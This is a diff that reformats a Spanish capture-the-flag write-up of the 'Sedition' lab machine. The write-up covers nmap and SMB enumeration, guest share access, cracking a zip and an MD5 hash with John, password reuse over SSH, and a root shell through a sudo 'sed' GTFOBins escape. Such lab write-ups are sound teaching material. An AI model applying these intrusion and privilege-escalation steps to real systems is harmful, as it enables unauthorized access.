@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Sedition
+---
+icon: linux
+---
 
-**Plataforma:** The Hackers Labs  
-**Sistema Operativo:** Linux  
+# Sedition ​
+
+## 🖥️ Writeup - Sedition
+
+**Plataforma:** The Hackers Labs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `SMB` `Zip Cracking` `John` `MariaDB` `Information Leakage` `Sudoers`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el archivo `zip` que contiene la `.ova` de la máquina Sedition, lo extraemos y la importamos en VirtualBox.
 
 Configuramos la interfaz de red de la máquina Sedition y la iniciamos junto a nuestra máquina atacante.
 
-# RECONOCIMIENTO DE HOSTS
+## RECONOCIMIENTO DE HOSTS
 
 En este punto, aún desconocemos la dirección `IP` asignada a la máquina, por lo que procedemos a descubrirla:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                                
@@ -30,23 +38,24 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
  10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
  10.0.4.3        08:00:27:67:2e:3e      1      60  PCS Systemtechnik GmbH      
  10.0.4.52       08:00:27:9a:e7:06      1      60  PCS Systemtechnik GmbH
- ```
+```
 
 Identificamos con seguridad que la `IP` de la víctima es `10.0.4.52`.
 
-# ESCANEO DE PUERTOS    
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para identificar qué puertos están abiertos, seguido de un escaneo más exhaustivo para enumerar las versiones y servicios que corren en ellos.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.52
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p139,445,65535 --min-rate 5000 10.0.4.52
 ```
 
 Info:
+
 ```
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-29 02:51 +0100
 Nmap scan report for 10.0.4.52
@@ -77,15 +86,16 @@ Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
 
 Identificamos los puertos `139` y `445` (SMB) abiertos, así como un servicio `SSH` corriendo en un puerto no estándar, el `65535`.
 
-# ENUMERACIÓN SMB
+## ENUMERACIÓN SMB
 
 Dado que los puertos de `Samba` están abiertos, utilizamos `enum4linux` para intentar listar usuarios y recursos compartidos.
 
-```Bash
+```bash
 enum4linux -a 10.0.4.52
 ```
 
 Info:
+
 ```
 
  =============================( Enumerating Workgroup/Domain on 10.0.4.52 )=============================
@@ -121,11 +131,12 @@ El recurso compartido `backup` parece ser accesible sin credenciales (Mapping: O
 
 Procedemos a inspeccionar el contenido del recurso `backup` utilizando `smbclient` y el usuario `guest`.
 
-```Bash
+```bash
 smbclient //10.0.4.52/backup -U guest
 ```
 
 Info:
+
 ```
 Password for [WORKGROUP\guest]:
 Try "help" to get a list of possible commands.
@@ -144,31 +155,34 @@ Encontramos un archivo llamado `secretito.zip`, el cual descargamos a nuestra m�
 
 Al intentar descomprimirlo, nos solicita una contraseña que desconocemos.
 
-```Bash
+```bash
 unzip secretito.zip 
 ```
 
 Info:
+
 ```
 Archive:  secretito.zip
 [secretito.zip] password password: 
    skipping: password                incorrect password
 ```
-# CRACKING
+
+## CRACKING
 
 Para obtener la contraseña del archivo comprimido, primero extraemos su `hash` utilizando `zip2john`.
 
-```Bash
+```bash
 zip2john secretito.zip > hash3.txt
 ```
 
 A continuación, utilizamos `John the Ripper` junto con el diccionario `rockyou.txt` para intentar crackear el `hash`.
 
-```Bash
+```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash3.txt
 ```
 
 Info:
+
 ```
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
@@ -184,11 +198,12 @@ Obtenemos la contraseña del archivo zip: `sebastian`.
 
 Ahora sí, descomprimimos el archivo para ver su contenido.
 
-```Bash
+```bash
 unzip secretito.zip 
 ```
 
 Info:
+
 ```
 elbunkermolagollon123
 ```
@@ -197,19 +212,20 @@ El archivo contiene lo que parece ser una contraseña: `elbunkermolagollon123`.
 
 Probamos a reutilizar esta contraseña con el usuario `cowboy` para conectarnos al servicio `SSH` en el puerto `65535`.
 
-```Bash
+```bash
 ssh cowboy@10.0.4.52 -p 65535
 ```
 
-# MOVIMIENTO LATERAL
+## MOVIMIENTO LATERAL
 
 Una vez dentro, realizamos una enumeración básica del sistema para buscar vías de escalada o movimiento lateral. Revisando el `historial de comandos` del usuario `cowboy`, encontramos información sensible.
 
-```Bash
+```bash
 cat .bash_history
 ```
 
 Info:
+
 ```
 history
 exit
@@ -222,13 +238,13 @@ El historial revela que el usuario se ha conectado a `MariaDB` utilizando la mis
 
 Aprovechamos esta información para conectarnos a la base de datos y enumerar su contenido.
 
-```Bash
+```bash
 mariadb -u cowboy -p
 ```
 
 Listamos las bases de datos y tablas disponibles.
 
-```SQL
+```sql
 MariaDB [(none)]> SHOW DATABASES;
 +--------------------+
 | Database           |
@@ -263,19 +279,20 @@ Obtenemos un `hash MD5` para el usuario `debian`. Tras crackearlo (podemos usar 
 
 Con esta credencial, migramos al usuario debian.
 
-```Bash
+```bash
 su debian
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Comprobamos permisos `sudo` y `SUID` para el usuario debian.
 
-```Bash
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for debian on sedition:
     env_reset, mail_badpass,
@@ -287,11 +304,12 @@ User debian may run the following commands on sedition:
 
 Vemos que tenemos permisos para ejecutar `sed` como `root` sin contraseña. Consultamos `GTFOBins` y encontramos que podemos usar sed para invocar una shell.
 
-```Bash
+```bash
 sudo /usr/bin/sed -n '1e exec /bin/sh 1>&0' /etc/hosts
 ```
 
 Info:
+
 ```
 # whoami
 root
